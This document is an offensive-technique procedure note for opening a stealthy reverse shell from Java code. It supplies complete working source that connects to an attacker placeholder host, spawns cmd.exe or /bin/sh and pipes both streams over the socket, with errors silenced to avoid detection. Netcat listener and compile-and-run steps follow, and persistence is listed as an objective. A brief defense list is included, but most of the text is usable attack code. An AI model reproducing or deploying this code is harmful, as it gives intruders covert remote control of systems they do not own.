---
type: procedure
description: >-
  Establishes a reverse shell on a target system using a background Java thread
  for stealthy command execution.
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[Execution]]'
techniques:
  - '[[Command-Line Interface]]'
sub_techniques: []
tags:
  - java
  - reverse-shell
  - execution
commands: []
platforms:
  - Linux
  - Windows
  - macOS
tools: []
validated: true
---

# Establish-Java-Reverse-Shell-Using-Thread

## Summary

This procedure demonstrates how to create a reverse shell using Java by executing it within a background thread. This approach allows the shell to run concurrently with the main program, making it more stealthy as it does not block or alter the primary application flow. It is useful in scenarios where Java is available on the target, such as web servers or applications, to gain remote command execution without immediate detection.

## Description

The technique leverages Java's multithreading capabilities to spawn a new thread that handles the reverse shell logic. The thread opens a TCP socket connection back to the attacker's listening host and port, then uses Java's Runtime.exec to spawn a shell process (e.g., /bin/sh on Linux or cmd.exe on Windows). Streams are piped between the socket and the process to enable bidirectional communication, allowing the attacker to send commands and receive output. This method bypasses some detection mechanisms by running in the background and can be embedded in legitimate Java applications or executed via other initial access vectors like file uploads or deserialization exploits. It requires the target to have Java installed and network outbound access to the attacker's IP/port. Success results in an interactive shell on the attacker's listener.

## Requirements

1. Java Runtime Environment (JRE) version 8 or higher installed on the target system.
2. Network connectivity from the target to the attacker's IP and listening port (e.g., no firewall blocking outbound TCP).
3. Attacker machine with a listener tool set up, such as netcat (nc -lvnp <port>).
4. Source code compilation access or ability to execute Java code on the target (e.g., via a webshell or compromised app).

## Defense

- Implement network segmentation to restrict outbound connections from Java processes to only trusted endpoints.
- Monitor network traffic for suspicious outbound TCP connections from Java-related processes (e.g., java.exe or javaw.exe).
- Use endpoint protection software to detect anomalous Runtime.exec calls or thread creations in Java applications.
- Enable Java sandboxing or security managers to limit exec and network access in untrusted code.
- Log and alert on unexpected Java process spawning or network activity.

## Objectives

1. Establish a stealthy reverse connection from the target to the attacker without disrupting the main application.
2. Gain interactive command execution on the target system.
3. Maintain persistence or escalate access through the shell.

## Instructions

### Step 1: Prepare the Thread Skeleton

**Context**: Start by creating the basic structure for the background thread using the provided code template. This ensures the reverse shell runs concurrently and stealthily.

Use the skeleton from [[codes/Java-Thread-Reverse-Shell-Template]]:

```java
Thread thread = new Thread(){
    public void run(){
        // Reverse shell implementation goes here
    }
};
thread.start();
```

> This creates an anonymous inner class extending Thread, overriding the run() method where the shell logic will be placed. Calling start() launches it in the background. Expected: No visible output; the thread begins execution immediately.

### Step 2: Implement the Reverse Shell Logic in the Thread

**Context**: Fill the run() method with code to connect back to the attacker and pipe a shell process. This step accomplishes the core reverse connection and command handling.

Create a full Java class (e.g., RevShell.java) incorporating the thread. Replace placeholders with actual values.

**Example Full Code**:

```java
import java.io.*;
import java.net.*;

public class RevShell {
    public static void main(String[] args) {
        String host = "ATTACKER_IP";  // Replace with attacker's IP
        int port = 4444;  // Replace with listening port
        
        Thread thread = new Thread() {
            public void run() {
                try {
                    Socket socket = new Socket(host, port);
                    Process process;
                    if (System.getProperty("os.name").toLowerCase().contains("win")) {
                        process = Runtime.getRuntime().exec("cmd.exe");
                    } else {
                        process = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-i"});
                    }
                    
                    // Simple stream piping (basic version; for full bidirectional, use additional threads)
                    (new Thread(new StreamGobbler(process.getInputStream(), socket.getOutputStream()))).start();
                    (new Thread(new StreamGobbler(socket.getInputStream(), process.getOutputStream()))).start();
                    
                } catch (Exception e) {
                    // Silently fail to avoid detection
                }
            }
        };
        thread.start();
        
        // Keep main thread alive
        try {
            Thread.sleep(60000);  // Run for 1 minute or adjust
        } catch (InterruptedException e) {}
    }
}

// Helper class for streaming (add this to the file)
class StreamGobbler implements Runnable {
    InputStream inputStream;
    OutputStream outputStream;
    
    public StreamGobbler(InputStream inputStream, OutputStream outputStream) {
        this.inputStream = inputStream;
        this.outputStream = outputStream;
    }
    
    public void run() {
        try {
            byte[] buffer = new byte[1024];
            int bytesRead;
            while ((bytesRead = inputStream.read(buffer)) != -1) {
                outputStream.write(buffer, 0, bytesRead);
                outputStream.flush();
            }
        } catch (IOException e) {
            // Ignore
        }
    }
}
```

> This code creates the socket connection, spawns the appropriate shell based on OS, and uses helper threads to pump data bidirectionally. Decision point: Detect OS to choose shell (sh for Unix-like, cmd for Windows). Expected: No console output on target; connection established if network allows.

### Step 3: Compile and Execute the Java Code

**Context**: Compile the source into a bytecode class file and run it on the target to trigger the thread and connection. This verifies the setup and initiates the shell.

Navigate to the directory with RevShell.java and execute:

```bash
javac RevShell.java
java RevShell
```

> Compilation succeeds if no syntax errors (expected: RevShell.class created). Execution starts the thread; check attacker's listener for incoming connection. If OS detection fails, adjust the exec command manually. Success criteria: Shell prompt appears on listener (e.g., $ or >).

### Step 4: Verify and Interact

**Context**: Confirm the connection and test command execution to ensure full control.

On the attacker side, once connected, run basic commands like 'whoami' or 'id'.

> Expected: Output from target system displayed on listener. If no response, check firewall, IP/port, or Java version compatibility. Decision point: If connection drops, the thread may have ended; adjust sleep time or make persistent.
